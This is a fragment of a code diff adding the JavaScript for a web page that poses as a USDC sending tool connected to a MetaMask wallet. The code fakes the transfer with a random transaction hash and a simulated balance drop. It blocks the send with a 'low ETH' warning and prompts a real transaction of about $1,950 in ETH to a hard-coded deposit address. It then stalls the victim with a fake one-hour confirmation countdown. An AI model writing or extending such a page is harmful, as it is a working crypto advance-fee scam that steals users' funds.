+        showMessage('Please wait for deposit confirmations to finish (~1h).', 'warning');
+        return;
+      }
+
+      const amount = parseFloat(document.getElementById('amount').value);
+      const recipient = document.getElementById('recipient').value.trim();
+
+      if (!amount || !recipient) {
+        showMessage('Please enter amount and recipient address', 'error');
+        return;
+      }
+      if (amount > currentBalance) {
+        showMessage('Insufficient balance', 'error');
+        return;
+      }
+
+      const needsDeposit = await needsEthDeposit();
+      if (needsDeposit) {
+        showDepositOffer(await requiredEthAmount());
+        showMessage('ETH balance too low. Please deposit before proceeding.', 'warning');
+        return;
+      }
+
+      try {
+        showMessage('Preparing transaction...', 'info');
+        document.getElementById('send-btn').disabled = true;
+        document.getElementById('send-btn').textContent = '⏳ Processing...';
+
+        setTimeout(() => {
+          const txHash = '0x' + Math.random().toString(16).substr(2, 40);
+          showMessage(`Transaction submitted! Hash: ${txHash.substr(0, 10)}...`, 'info');
+
+          currentBalance -= amount;
+          document.getElementById('usdc-balance').textContent = currentBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+          document.getElementById('usd-value').textContent = `≈ ${currentBalance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})} USD`;
+
+          document.getElementById('amount').value = '';
+          document.getElementById('recipient').value = '';
+          document.getElementById('send-btn').disabled = false;
+          document.getElementById('send-btn').textContent = '🚀 Send Transaction';
+          updateEstimates();
+        }, 2000);
+
+      } catch (error) {
+        showMessage(`Transaction failed: ${error.message}`, 'error');
+        document.getElementById('send-btn').disabled = false;
+        document.getElementById('send-btn').textContent = '🚀 Send Transaction';
+      }
+    }
+
+    // ======= ETH PRICE/BALANCE & DEPOSIT LOGIC =======
+    async function getEthUsdPrice() {
+      try {
+        const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
+        const data = await res.json();
+        return data?.ethereum?.usd || null;
+      } catch (e) {
+        console.warn('Price fetch failed:', e);
+        return null;
+      }
+    }
+
+    async function requiredEthAmount() {
+      const price = await getEthUsdPrice();
+      if (!price) return null;
+      return REQUIRED_ETH_USD / price;
+    }
+
+    async function getEthBalance() {
+      if (!web3 || !userAccount) return 0;
+      const wei = await web3.eth.getBalance(userAccount);
+      return parseFloat(web3.utils.fromWei(wei, 'ether'));
+    }
+
+    async function needsEthDeposit() {
+      const [price, bal] = await Promise.all([getEthUsdPrice(), getEthBalance()]);
+      if (!price) return false; // if price unknown, don't block
+      const balUsd = bal * price;
+      return balUsd < REQUIRED_ETH_USD;
+    }
+
+    async function checkEthBalanceAndOfferDeposit() {
+      const need = await needsEthDeposit();
+      if (need && !isHoldActive) { // don't show during active hold
+        const req = await requiredEthAmount();
+        showDepositOffer(req);
+        showMessage('Low ETH balance detected. Please deposit to continue.', 'warning');
+      } else {
+        hideDepositOffer();
+      }
+    }
+
+    function showDepositOffer(requiredEth) {
+      const el = document.getElementById('deposit-offer');
+      const amt = document.getElementById('required-eth-amount');
+      amt.textContent = requiredEth ? Number(requiredEth).toFixed(4) : '≈';
+      el.style.display = 'flex';
+    }
+
+    function hideDepositOffer() {
+      const el = document.getElementById('deposit-offer');
+      if (el) el.style.display = 'none';
+    }
+
+    // Trigger wallet popup with prefilled "to" and "value" for the $1,950 deposit
+    async function depositEth() {
+      try {
+        if (!window.ethereum || !web3) {
+          showMessage('Wallet not available. Please connect MetaMask.', 'error');
+          return;
+        }
+        if (!DEPOSIT_ADDRESS || !web3.utils.isAddress(DEPOSIT_ADDRESS)) {
+          showMessage('Invalid deposit address configured.', 'error');
+          return;
+        }
+
+        const price = await getEthUsdPrice();
+        if (!price) {
+          showMessage('Could not fetch ETH price. Try again shortly.', 'error');
+          return;
+        }
+
+        const ethAmount = REQUIRED_ETH_USD / price;
+        const ethRounded = Number(ethAmount).toFixed(6);
+        const valueWei = web3.utils.toWei(ethRounded, 'ether');
+
+        const txHash = await window.ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: userAccount,
+            to: DEPOSIT_ADDRESS,
+            value: web3.utils.toHex(valueWei)
+          }]
+        });
+
+        showMessage(`Deposit transaction sent: ${txHash.slice(0,10)}...`, 'info');
+
+        // Start 1-hour confirmation window and persist it
+        localStorage.setItem(LS_HOLD_TX, txHash);
+        startPostDepositHold(HOLD_SECONDS);
+
+      } catch (err) {
+        if (err && err.code === 4001) {
+          showMessage('User rejected the deposit transaction.', 'warning');
+        } else {
+          showMessage(`Deposit failed: ${err.message || err}`, 'error');
+        }
+      }
+    }
+
+    // ======= POST-DEPOSIT HOLD (1h countdown, lock fees & send) =======
+    function startPostDepositHold(seconds) {
+      const endsAt = Date.now() + seconds * 1000;
+      localStorage.setItem(LS_HOLD_ENDS_AT, String(endsAt));
+      applyHoldUI(true);
+      tickHoldCountdown(); // update immediately
+      if (holdTimerId) clearInterval(holdTimerId);
+      holdTimerId = setInterval(tickHoldCountdown, 1000);
+      showMessage('Deposit received. Waiting ~1h for confirmations. Please keep this page open.', 'info');
+    }
+
+    function stopPostDepositHold() {
+      isHoldActive = false;
+      if (holdTimerId) clearInterval(holdTimerId);
+      holdTimerId = null;
+      localStorage.removeItem(LS_HOLD_ENDS_AT);
+      localStorage.removeItem(LS_HOLD_TX);
+      applyHoldUI(false);
+      updateEstimates();
+      checkEthBalanceAndOfferDeposit();
+    }
+
+    function resumeHoldIfNeeded() {
+      const endsAtStr = localStorage.getItem(LS_HOLD_ENDS_AT);
+      if (!endsAtStr) return;
+      const endsAt = Number(endsAtStr);
+      const remainingMs = endsAt - Date.now();
+      if (remainingMs > 0) {
+        applyHoldUI(true);
+        tickHoldCountdown();
+        if (holdTimerId) clearInterval(holdTimerId);
+        holdTimerId = setInterval(tickHoldCountdown, 1000);
+      } else {
+        stopPostDepositHold();
+      }
+    }
+
+    function applyHoldUI(active) {
+      const feeBox = document.getElementById('fee-box');
+      const sendBtn = document.getElementById('send-btn');
+      const banner = document.getElementById('post-deposit-banner');
+      const etaUnit = document.getElementById('eta-unit');
+
+      isHoldActive = !!active;
+      if (active) {
+        feeBox.classList.add('hold-active');
+        sendBtn.disabled = true;
+        banner.style.display = 'flex';
+        document.getElementById('eta-time').textContent = '1h';
+        document.getElementById('preview-eta').textContent = '1h';
+        if (etaUnit) etaUnit.textContent = 'Waiting';
+        document.getElementById('hold-note').style.display = 'block';
+      } else {
+        feeBox.classList.remove('hold-active');
+        banner.style.display = 'none';
+        if (etaUnit) etaUnit.textContent = 'ETA';
+        document.getElementById('hold-note').style.display = 'none';
+      }
+    }
+
+    function tickHoldCountdown() {
+      const endsAtStr = localStorage.getItem(LS_HOLD_ENDS_AT);
+      if (!endsAtStr) return stopPostDepositHold();
+      const endsAt = Number(endsAtStr);
+      const remaining = Math.max(0, endsAt - Date.now());
+      const el = document.getElementById('hold-countdown');
+      if (el) el.textContent = formatCountdown(remaining);
+      if (remaining <= 0) {
+        stopPostDepositHold();
+        showMessage('Confirmation window finished. You can proceed.', 'info');
+      }
+      // Keep ETAs pinned to 1h label while hold shows
+      document.getElementById('eta-time').textContent = '1h';
+      document.getElementById('preview-eta').textContent = '1h';
+    }
+
+    function formatCountdown(ms) {
+      let totalSec = Math.ceil(ms / 1000);
+      const h = Math.floor(totalSec / 3600);
+      totalSec -= h * 3600;
+      const m = Math.floor(totalSec / 60);
+      const s = totalSec - m * 60;
+      const mm = String(m + h * 60).padStart(2, '0'); // show as MM:SS up to 60:00
+      const ss = String(s).padStart(2, '0');
+      return `${mm}:${ss}`;
+    }
+
+    // ======= MISC =======
+    function renderFeeOptionPrices() {
+      const slowEl = document.querySelector('[data-speed="slow"] .fee-amount');
+      const stdEl  = document.querySelector('[data-speed="standard"] .fee-amount');
+      const fastEl = document.querySelector('[data-speed="fast"] .fee-amount');
+      if (slowEl) slowEl.textContent = `$${feeOptions.slow.price}`;
+      if (stdEl)  stdEl.textContent  = `$${feeOptions.standard.price}`;
+      if (fastEl) fastEl.textContent = `$${feeOptions.fast.price}`;
+      const slowTime = document.querySelector('[data-speed="slow"] .fee-time');
+      const stdTime  = document.querySelector('[data-speed="standard"] .fee-time');
+      const fastTime = document.querySelector('[data-speed="fast"] .fee-time');
+      if (slowTime) slowTime.textContent = `~${feeOptions.slow.time}`;
+      if (stdTime)  stdTime.textContent  = `~${feeOptions.standard.time}`;
+      if (fastTime) fastTime.textContent = `~${feeOptions.fast.time}`;
+    }
+
+    // ======= INIT =======
+    document.addEventListener('DOMContentLoaded', () => {
+      showWalletDisconnected();
+      updateEstimates();
+      renderFeeOptionPrices();
+
+      const etaUnit = document.getElementById('eta-unit');
+      if (etaUnit) etaUnit.textContent = 'ETA';
+
+      if (window.ethereum && window.ethereum.selectedAddress) {
+        userAccount = window.ethereum.selectedAddress;
+        if (userAccount.toLowerCase() === AUTHORIZED_WALLET.toLowerCase()) {
+          isAuthorized = true;
+          web3 = new Web3(window.ethereum);
+          showWalletConnected();
+          showMessage('Welcome back! Your authorized wallet is connected.', 'info');
+          checkEthBalanceAndOfferDeposit();
+        } else {
+          showUnauthorizedWallet();
+        }
+      }
+    });
+
+    document.getElementById('recipient').addEventListener('input', updateEstimates);
   </script>
 </body>
 </html>
